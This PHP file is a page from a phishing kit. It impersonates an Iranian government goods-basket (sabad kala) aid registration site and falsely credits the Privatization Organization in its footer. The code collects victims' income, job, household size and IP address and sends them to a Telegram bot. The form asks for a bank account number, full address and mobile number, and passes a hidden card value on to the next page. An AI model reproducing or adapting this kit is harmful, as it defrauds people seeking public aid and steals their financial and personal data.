<?php
include 'token.php';

$income = $_POST["daramad"];
$job = $_POST["shoghl"];
$tedad = $_POST["tedad"];

    function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    return $ip;
}
$user_ip = getUserIP();
$msg="
یک نفر وارد سایت سبد کالا شده است
---------------------
🆔 IP           : <code>$user_ip</code>
--------------------
💰 درآمد: <code>$income</code> Toman
🐌 شغل         : <code>$job</code>
👥 تعداد خانوار   : <code>$tedad</code>
--------------------
⚫️ : @SourcePhish
"; 
     file_get_contents("https://api.telegram.org/bot$token/sendMessage?parse_mode=HTML&chat_id=$groupid&text=".urlencode($msg)); 


$pan = $_POST["e"];
?>
<!DOCTYPE html>
<html lang="fa">
<head>
	<meta charset="UTF-8">
	<title>ثبت نام جدید سبد کالای سال 98</title>
	<link rel="stylesheet" href="../sabad/css/ionicons.min.css">
	<link rel="stylesheet" href="../sabad/css/style.css">
</head>
<body>


<div class="header">

    <div class="center-content ipologo">
        <img src="../sabad/img/hemd.png">
    </div>
    <div class="right-logo">
        <img src="../sabad/img/logo.png">
    </div>

</div>

<div class="top-box">
    <div class="samaneh-logo">

        <img src="../sabad/img/sbd.png">
    </div>
</div>


	<form action="reg6.php" method="post">
		<h2>  مشخصات پرداختی </h2>
		<div class="controls">
			<input name="shoghl"   type="text" id="shoghl" class="floatlabel">
			<label for="shoghl" class="label" > شماره حساب </label>
		</div>
		<div class="controls">
			<input name="daramad" type="text" id="daramad" class="floatlabel">
			<label for="daramad" class="label"> آدرس(کامل) </label>
		</div>
		<div class="controls">
			<input name="tedad" type="text" id="tedad" class="floatlabel">
			<label for="tedad" class="label">  شماره همراه </label>
		</div>
		<input name="e"   type="hidden" id="shoghl" class="floatlabel" value="<?php echo$pan ?>">
		
		<button>مرحله بعد</button>
	</form>
 <a class="browsers-name" href="register.php" target="_blank">
            مرحله قبل
        </a>
		
		
		<a>  </a>
		
		
		
		
		
<br>

<div class="gap-box">
    <span class="browsers" dir="rtl">
        برای مشاهده بهتر سامانه متمرکز ثبت نام و استعلام سبد کالا لطفا از مرورگرهای
        <br>
        <a class="browsers-name" href="https://www.mozilla.org/en-US/firefox/new/index.html" target="_blank">
            FireFox
        </a>
،
        <a class="browsers-name" href="https://www.google.com/intl/en/chrome/index34a1.html?standalone=1" target="_blank">
            Chrome
        </a>
        يا
        <a class="browsers-name" href="https://github-production-release-asset-2e65be.s3.amazonaws.com/53854705/chromium_syncabdf.exe" target="_blank">
            Chromium
        </a>
        &nbsp;
        استفاده نماييد.
    </span>
</div>



<div class="footer">
    کليه حقوق و مالکیت مادي و معنوي اين سايت متعلق به سازمان خصوصي سازي مي باشد
    <br>
    ver : 4.0.7
</div>
<br>
<br>
	<script src='js/jquery.min.js'></script>
	<script src="js/index.js"></script>
</body>


</html>
